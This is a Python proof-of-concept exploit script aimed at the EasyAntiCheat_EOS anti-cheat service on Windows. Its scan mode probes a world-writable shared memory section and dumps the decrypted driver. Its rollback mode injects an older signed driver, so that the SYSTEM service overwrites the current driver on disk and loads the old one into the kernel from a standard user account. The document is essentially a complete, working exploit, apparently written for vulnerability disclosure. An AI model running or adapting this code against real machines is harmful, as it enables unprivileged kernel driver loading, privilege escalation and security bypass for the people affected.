#!/usr/bin/env python3

"""
EasyAntiCheat - Unprivileged Kernel Driver Loading via SYSTEM Service Abuse (Rollback of Signed Drivers)

Usage:
  python poc_final.py -scan                          Scan shared memory (R/W/X access)
  python poc_final.py -rollback <path_to_old.sys>    Load old driver into kernel
  python poc_final.py -h                             Help
"""
import ctypes, ctypes.wintypes as wt, struct, sys, time, os, hashlib, argparse

k32 = ctypes.windll.kernel32
adv = ctypes.windll.advapi32
k32.OpenFileMappingW.restype = wt.HANDLE
k32.OpenFileMappingW.argtypes = [wt.DWORD, wt.BOOL, wt.LPCWSTR]
k32.MapViewOfFile.restype = ctypes.c_void_p
k32.MapViewOfFile.argtypes = [wt.HANDLE, wt.DWORD, wt.DWORD, wt.DWORD, ctypes.c_size_t]
k32.UnmapViewOfFile.argtypes = [ctypes.c_void_p]
k32.OpenEventW.restype = wt.HANDLE
k32.OpenEventW.argtypes = [wt.DWORD, wt.BOOL, wt.LPCWSTR]
k32.RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
k32.CreateFileW.restype = ctypes.c_void_p
k32.CreateFileW.argtypes = [wt.LPCWSTR, wt.DWORD, wt.DWORD, ctypes.c_void_p, wt.DWORD, wt.DWORD, ctypes.c_void_p]
adv.OpenSCManagerW.restype = ctypes.c_void_p
adv.OpenSCManagerW.argtypes = [wt.LPCWSTR, wt.LPCWSTR, wt.DWORD]
adv.OpenServiceW.restype = ctypes.c_void_p
adv.OpenServiceW.argtypes = [ctypes.c_void_p, wt.LPCWSTR, wt.DWORD]
adv.QueryServiceStatus.restype = wt.BOOL
adv.QueryServiceStatus.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
adv.CloseServiceHandle.restype = wt.BOOL
adv.CloseServiceHandle.argtypes = [ctypes.c_void_p]

SHM = "Global\\EasyAntiCheat_EOSBin"
EVTS = ["Global\\EasyAntiCheat_EOSEventModule",
        "Global\\EasyAntiCheat_EOSEventDriver",
        "Global\\EasyAntiCheat_EOSEventGame"]
SVC = "EasyAntiCheat_EOSSys"
DISK = "C:\\Program Files (x86)\\EasyAntiCheat_EOS\\EasyAntiCheat_EOS.sys"
SDDL = "D:(A;OICI;GA;;;BG)(A;OICI;GA;;;AN)(A;OICI;GRGWGX;;;AU)(A;OICI;GA;;;BA)"
INVALID = 0xFFFFFFFFFFFFFFFF

class SVC_STATUS(ctypes.Structure):
    _fields_ = [("t",wt.DWORD),("s",wt.DWORD),("c",wt.DWORD),("e",wt.DWORD),
                ("se",wt.DWORD),("cp",wt.DWORD),("w",wt.DWORD)]

def rd(p, off, n): return bytes((ctypes.c_ubyte*n).from_address(p+off))
def rd4(p, off): return struct.unpack_from('<I', rd(p,off,4), 0)[0]

def encrypt(data):
    d=bytearray(data); n=len(d)
    if n<2: return bytes(d)
    d[0]=(d[0]+d[1])&0xFF
    for i in range(1,n-1): d[i]=(d[i]+3*i+d[i+1])&0xFF
    d[n-1]=(d[n-1]+3*n-3)&0xFF
    return bytes(d)

def decrypt(data):
    d=bytearray(data); n=len(d)
    if n<2: return bytes(d)
    d[n-1]=(d[n-1]+(3-3*n))&0xFF
    for i in range(n-2,0,-1): d[i]=(d[i]+(-3*i-d[i+1]))&0xFF
    d[0]=(d[0]-d[1])&0xFF
    return bytes(d)

def svc_state():
    scm=adv.OpenSCManagerW(None,None,1)
    if not scm: return -1
    s=adv.OpenServiceW(scm,SVC,4)
    if not s: adv.CloseServiceHandle(scm); return -1
    ss=SVC_STATUS(); adv.QueryServiceStatus(s,ctypes.byref(ss))
    adv.CloseServiceHandle(s); adv.CloseServiceHandle(scm)
    return ss.s

def hexdump(data, off=0, rows=4):
    for i in range(0, min(len(data), rows*16), 16):
        h=' '.join(f'{b:02x}' for b in data[i:i+16])
        a=''.join(chr(b) if 32<=b<127 else '.' for b in data[i:i+16])
        print(f'    {off+i:08x}: {h:<48s} {a}')


def cmd_scan():
    """Scan shared memory — proves R/W/X access from standard user."""
    print("\n[*] EasyAntiCheat Shared Memory Scanner")
    print("=" * 65)
    print(f"\n  Waiting for EAC shared memory (launch an EAC-protected game)...")

    while True:
        h = k32.OpenFileMappingW(0x6, False, SHM)
        if h:
            p = k32.MapViewOfFile(h, 0x6, 0, 0, 0)
            if p: break
            k32.CloseHandle(h)
        time.sleep(0.1)

    print(f"  Shared memory detected!\n")

    # --- Access test ---
    k32.UnmapViewOfFile(p); k32.CloseHandle(h)
    access_results = []
    for acc, label in [(0x4,"READ"), (0x2,"WRITE"), (0x6,"READ|WRITE"), (0xF001F,"ALL_ACCESS")]:
        th = k32.OpenFileMappingW(acc, False, SHM)
        if th:
            access_results.append((acc, label, True))
            k32.CloseHandle(th)
        else:
            access_results.append((acc, label, False))

    print(f"  Shared Memory: {SHM}")
    print(f"  SDDL: {SDDL}")
    print(f"  Anonymous Logon (AN): GENERIC_ALL")
    print(f"  Authenticated Users (AU): READ | WRITE | EXECUTE\n")
    print(f"  Access Test:")
    for acc, label, ok in access_results:
        print(f"    FILE_MAP_{label:<15s} (0x{acc:05X}): {'GRANTED' if ok else 'DENIED'}")

    # --- Map R/W ---
    h = k32.OpenFileMappingW(0x6, False, SHM)
    if not h:
        print(f"\n  [-] Cannot reopen shared memory.")
        return
    p = k32.MapViewOfFile(h, 0x6, 0, 0, 0)
    if not p:
        print(f"\n  [-] Cannot map shared memory.")
        k32.CloseHandle(h); return

    writable = True
    print(f"\n  Mapped at: 0x{p:X} (READ/WRITE)")

    # --- Header ---
    hdr = rd(p, 0, 28)
    ver, total, block, flags, pid, status, dsz = struct.unpack('<IIIIIII', hdr)
    print(f"\n  Header:")
    print(f"    Version:     {ver}")
    print(f"    Total Size:  0x{total:X} ({total//1048576} MB)")
    print(f"    Block Size:  0x{block:X}")
    print(f"    Flags:       0x{flags:X}")
    print(f"    Game PID:    {pid}")
    print(f"    Status:      {status} ({'loaded' if status==1 else 'pending'})")
    print(f"    Data Size:   0x{dsz:X} ({dsz:,} bytes)")

    # --- Wait for driver data if not yet available ---
    if dsz == 0:
        print(f"\n  Waiting for driver data to appear in shared memory...")
        while True:
            dsz = rd4(p, 24)
            pid = rd4(p, 16)
            status = rd4(p, 20)
            if dsz > 0:
                print(f"    Data arrived: 0x{dsz:X} ({dsz:,} bytes)")
                print(f"    Game PID:     {pid}")
                print(f"    Status:       {status}")
                break
            time.sleep(0.1)

    # Wait a moment for service to finish processing (status=1)
    if status == 0:
        print(f"  Waiting for service to finish processing...")
        for _ in range(60):
            status = rd4(p, 20)
            if status != 0:
                print(f"    Status: {status} ({'loaded' if status==1 else 'failed'})")
                break
            time.sleep(0.5)
        pid = rd4(p, 16)

    # --- Write test ---
    print(f"\n  Write Test:")
    test_off = 0x2000
    orig = rd(p, test_off, 8)
    marker = b'\xDE\xAD\xC0\xDE\xBE\xEF\xCA\xFE'
    ctypes.memmove(p + test_off, marker, 8)
    check = rd(p, test_off, 8)
    ctypes.memmove(p + test_off, orig, 8)
    if check == marker:
        print(f"    Write at 0x{test_off:X}: CONFIRMED (wrote and read back marker)")
    else:
        print(f"    Write at 0x{test_off:X}: FAILED")
        writable = False

    # --- Events ---
    print(f"\n  Named Events:")
    for name in EVTS:
        short = name.split("\\")[-1]
        eh = k32.OpenEventW(0x1F0003, False, name)
        if not eh: eh = k32.OpenEventW(0x2|0x100000, False, name)
        if eh:
            print(f"    {short}: ACCESSIBLE (can signal)")
            k32.CloseHandle(eh)
        else:
            print(f"    {short}: denied")

    # --- Device ---
    print(f"\n  Device Access:")
    prefix = chr(92)*2 + '.' + chr(92)
    dh = k32.CreateFileW(prefix + 'EasyAntiCheat_EOS', 0xC0000000, 3, None, 3, 0, None)
    if dh and dh != INVALID:
        print("    \\\\.\\EasyAntiCheat_EOS: OPEN (GENERIC_READ|WRITE)")
        k32.CloseHandle(dh)
    else:
        print("    \\\\.\\EasyAntiCheat_EOS: not available")

    # --- Data scan ---
    if dsz > 0:
        print(f"\n  Data at offset 28:")
        sample = rd(p, 28, min(64, dsz))
        hexdump(sample, 28)
        if sample[:2] == b'MZ':
            e_lfanew = struct.unpack_from('<I', sample, 0x3C)[0] if len(sample) > 0x40 else 0
            print(f"    PE detected: e_lfanew=0x{e_lfanew:X}")

        # Scan for PE headers and module magic
        print(f"\n  Scanning {dsz//1048576}MB for PE headers and module magic...")
        pe_count = 0; magic_count = 0
        MAGIC = struct.pack('<Q', 0x3C7A8A0CCB53E178)
        chunk_sz = 0x100000
        for off in range(0, min(dsz, 0x4000000-28), chunk_sz):
            chunk = rd(p, 28+off, min(chunk_sz, dsz-off))
            idx = 0
            while True:
                idx = chunk.find(b'MZ', idx)
                if idx < 0: break
                if idx+0x42 < len(chunk):
                    elf = struct.unpack_from('<I', chunk, idx+0x3C)[0]
                    if 0x40 <= elf < 0x400 and idx+elf+4 < len(chunk):
                        if chunk[idx+elf:idx+elf+4] == b'PE\x00\x00':
                            ns = struct.unpack_from('<H', chunk, idx+elf+6)[0]
                            print(f"    PE at 0x{28+off+idx:X}: sections={ns}")
                            pe_count += 1
                idx += 2
            idx = 0
            while True:
                idx = chunk.find(MAGIC, idx)
                if idx < 0: break
                print(f"    Module magic at 0x{28+off+idx:X}")
                magic_count += 1
                idx += 8
        print(f"    Found: {pe_count} PE headers, {magic_count} module magics")

    # --- Decrypt and dump driver from shared memory ---
    if dsz > 0 and dsz < 0x4000000:
        print(f"\n  Decrypting driver from shared memory...")
        raw = rd(p, 28, dsz)
        decrypted = decrypt(raw)
        if decrypted[:2] == b'MZ':
            dec_hash = hashlib.sha256(decrypted).hexdigest()
            dec_lfanew = struct.unpack_from('<I', decrypted, 0x3C)[0]
            dec_ts = 0
            dec_secs = 0
            if dec_lfanew + 8 < len(decrypted):
                dec_ts = struct.unpack_from('<I', decrypted, dec_lfanew + 8)[0]
                dec_secs = struct.unpack_from('<H', decrypted, dec_lfanew + 6)[0]
            print(f"    Status:      VALID PE (MZ header)")
            print(f"    Size:        {len(decrypted):,} bytes")
            print(f"    PE date:     {time.ctime(dec_ts)}")
            print(f"    Sections:    {dec_secs}")
            print(f"    SHA256:      {dec_hash}")
            print(f"    First 64 bytes (decrypted):")
            hexdump(decrypted[:64], 0)

            # Offer to save
            dump_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'dumped_eac_driver.sys')
            try:
                with open(dump_path, 'wb') as df:
                    df.write(decrypted)
                print(f"\n    Saved decrypted driver to: {dump_path}")
            except Exception as e:
                print(f"\n    Could not save: {e}")
        else:
            print(f"    Decryption produced non-PE data (first bytes: {decrypted[:8].hex()})")
            print(f"    The data may already be decrypted or use a different format")
            # Try raw (maybe already decrypted)
            if raw[:2] == b'MZ':
                dec_hash = hashlib.sha256(raw).hexdigest()
                print(f"    Raw data IS a valid PE (already decrypted in-place by service)")
                print(f"    Size:   {len(raw):,} bytes")
                print(f"    SHA256: {dec_hash}")
                print(f"    First 64 bytes:")
                hexdump(raw[:64], 0)
                dump_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'dumped_eac_driver.sys')
                try:
                    with open(dump_path, 'wb') as df:
                        df.write(raw)
                    print(f"\n    Saved raw driver to: {dump_path}")
                except Exception as e:
                    print(f"\n    Could not save: {e}")

    # --- Driver file ---
    print(f"\n  Driver File:")
    if os.path.exists(DISK):
        fsz = os.path.getsize(DISK)
        with open(DISK, 'rb') as f: fhdr = f.read(2)
        print(f"    {DISK}")
        print(f"    Size: {fsz:,}  Header: {fhdr.hex()} ({'valid MZ' if fhdr==b'MZ' else 'CORRUPTED'})")
        lock = k32.CreateFileW(DISK, 0x80000000, 0, None, 3, 0, None)
        if lock and lock != INVALID:
            print(f"    Exclusive lock: POSSIBLE (low-priv user can lock driver file)")
            k32.CloseHandle(lock)
        else:
            print(f"    Exclusive lock: denied (driver may be in use)")

    # --- Service ---
    print(f"\n  Service:")
    st = svc_state()
    states = {-1:'not found', 1:'STOPPED', 2:'START_PENDING', 3:'STOP_PENDING', 4:'RUNNING'}
    print(f"    {SVC}: {states.get(st, f'state={st}')}")

    if dsz > 0:
        print(f"    Driver binary in shm: {dsz:,} bytes")
    print(f"{'='*65}")

    k32.UnmapViewOfFile(p); k32.CloseHandle(h)


# ============================================================
def cmd_rollback(driver_path):
    """Load an old EAC driver via shared memory injection."""
    print("\n[*] EasyAntiCheat — Kernel Driver Rollback")
    print("=" * 65)

    # --- Check if service is already running ---
    st = svc_state()
    if st == 4:
        print(f"\n  [!] EasyAntiCheat service is currently RUNNING.")
        print(f"      Close all EAC-protected games and wait for the service to stop.")
        print(f"      Waiting", end='', flush=True)
        while svc_state() == 4:
            print('.', end='', flush=True)
            time.sleep(2)
        print(f" stopped.")
    elif st > 0 and st != 4:
        print(f"\n  [*] Service state: {st} (waiting for it to stop)")
        while svc_state() > 0 and svc_state() != -1:
            time.sleep(1)

    # --- Check if shm already exists (stale from previous session) ---
    stale = k32.OpenFileMappingW(0x6, False, SHM)
    if stale:
        k32.CloseHandle(stale)
        print(f"\n  [!] Stale shared memory detected from previous session.")
        print(f"      Close all games and wait for it to be released.")
        print(f"      Waiting", end='', flush=True)
        while True:
            check = k32.OpenFileMappingW(0x6, False, SHM)
            if not check: break
            k32.CloseHandle(check)
            print('.', end='', flush=True)
            time.sleep(2)
        print(f" cleared.")

    print(f"\n  [+] Environment is clean. Ready to inject.")

    # --- Load driver ---
    if not os.path.exists(driver_path):
        print(f"[-] Not found: {driver_path}"); return 1
    with open(driver_path, 'rb') as f: plain = f.read()
    if plain[:2] != b'MZ':
        print(f"[-] Not a valid PE"); return 1
    phash = hashlib.sha256(plain).hexdigest()
    pe_ts = struct.unpack_from('<I', plain, struct.unpack_from('<I', plain, 0x3C)[0] + 8)[0]
    print(f"\n  [1] Target driver:")
    print(f"      Path:      {driver_path}")
    print(f"      Size:      {len(plain):,} bytes")
    print(f"      PE date:   {time.ctime(pe_ts)}")
    print(f"      SHA256:    {phash}")

    # --- Encrypt ---
    print(f"\n  [2] Encrypting ({len(plain):,} bytes)...")
    t0=time.perf_counter()
    enc = encrypt(plain)
    # Verify
    if decrypt(encrypt(plain[:5000])) != plain[:5000]:
        print(f"      [-] Cipher verification failed!"); return 1
    print(f"      Done in {time.perf_counter()-t0:.1f}s (verified)")

    # --- Pre-allocate ---
    print(f"\n  [3] Pre-allocating buffer...")
    t0=time.perf_counter()
    ebuf = (ctypes.c_char * len(enc))(*enc)
    eptr = ctypes.cast(ebuf, ctypes.c_void_p).value
    sbytes = struct.pack('<I', len(enc))
    sbuf = (ctypes.c_char * 4)(*sbytes)
    sptr = ctypes.cast(sbuf, ctypes.c_void_p).value
    print(f"      Ready ({(time.perf_counter()-t0)*1000:.0f}ms)")

    # --- Wait for shm ---
    print(f"\n  [4] Waiting for shared memory...")
    print(f"      >>> Launch the game NOW <<<\n")
    while True:
        h = k32.OpenFileMappingW(0x6, False, SHM)
        if h:
            p = k32.MapViewOfFile(h, 0x6, 0, 0, 0)
            if p: break
            k32.CloseHandle(h)
        time.sleep(0.005)

    evt = k32.OpenEventW(0x1F0003, False, EVTS[0])
    if not evt: evt = k32.OpenEventW(0x2|0x100000, False, EVTS[0])

    # --- Inject ---
    t_go = time.perf_counter()
    k32.RtlMoveMemory(ctypes.c_void_p(p+24), ctypes.c_void_p(sptr), 4)
    k32.RtlMoveMemory(ctypes.c_void_p(p+28), ctypes.c_void_p(eptr), len(enc))
    t_wr = time.perf_counter()
    if evt: k32.SetEvent(evt)
    t_sig = time.perf_counter()

    print(f"  [5] INJECTED")
    print(f"      Write:  {(t_wr-t_go)*1000:.0f}ms ({len(enc):,} bytes)")
    print(f"      Signal: {(t_sig-t_go)*1000:.0f}ms")

    # --- Wait ---
    print(f"\n  [6] Waiting for SYSTEM service to process...")
    for _ in range(120):
        st = rd4(p, 20)
        if st: break
        time.sleep(0.25)
    t_done = time.perf_counter()
    svc = svc_state()

    print(f"\n  [7] RESULT")
    print(f"      SHM status:     {st} ({'SUCCESS' if st==1 else 'FAILED'})")
    print(f"      Service state:  {svc} ({'RUNNING' if svc==4 else 'NOT RUNNING'})")
    print(f"      Total time:     {(t_done-t_go)*1000:.0f}ms")

    # --- Verify disk ---
    print(f"\n  [8] Disk verification:")
    try:
        dsz = os.path.getsize(DISK)
        with open(DISK,'rb') as f: disk = f.read()
        dhash = hashlib.sha256(disk).hexdigest()
        print(f"      File:   {DISK}")
        print(f"      Size:   {dsz:,} bytes")
        print(f"      SHA256: {dhash}")
        if dhash == phash:
            print(f"      >>> EXACT MATCH — current driver OVERWRITTEN with our version <<<")
        else:
            match = sum(1 for a,b in zip(disk[:len(plain)], plain) if a==b)
            print(f"      Byte match: {match:,}/{min(len(disk),len(plain)):,} ({match*100/min(len(disk),len(plain)):.1f}%)")
    except Exception as e:
        print(f"      Error: {e}")

    # --- Final ---
    if evt: k32.CloseHandle(evt)
    k32.UnmapViewOfFile(p); k32.CloseHandle(h)

    if svc == 4:
        print(f"")
        print(f"  Driver:          {os.path.basename(driver_path)}")
        print(f"  PE timestamp:    {time.ctime(pe_ts)}")
        print(f"  Kernel status:   RUNNING (ring 0)")
        print(f"  Disk status:     Current driver OVERWRITTEN")
        return 0
    return 1


# ============================================================
def main():
    p = argparse.ArgumentParser(
        description='EasyAntiCheat_EOS \u2014 Kernel Driver Rollback Proof-of-Concept',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Description:
  This PoC demonstrates that a standard (non-administrator) user can
  influence a SYSTEM service to load a kernel driver from a world-
  writable shared memory section.

  By supplying a previously signed EasyAntiCheat driver, the service:
    - Decrypts controlled data
    - Overwrites the existing driver on disk
    - Validates publisher signature only
    - Loads the driver into the kernel (ring 0)

  This results in unprivileged kernel driver loading via SYSTEM
  service abuse.

Notes:
  - Only drivers signed by EasyAntiCheat Oy / Epic Games Inc. are accepted
  - No version or integrity binding is enforced

Examples:
  %(prog)s -scan
  %(prog)s -rollback "D:\\old_eac\\EasyAntiCheat_EOS.sys"
""")
    g = p.add_mutually_exclusive_group(required=True)
    g.add_argument('-scan', action='store_true',
                   help='Inspect shared memory and event access (R/W/X permissions, headers, state)')
    g.add_argument('-rollback', metavar='DRIVER',
                   help='Trigger driver rollback using a specified EAC-signed driver')
    args = p.parse_args()

    if args.scan:
        cmd_scan()
    elif args.rollback:
        sys.exit(cmd_rollback(args.rollback))

if __name__ == '__main__':
    main()
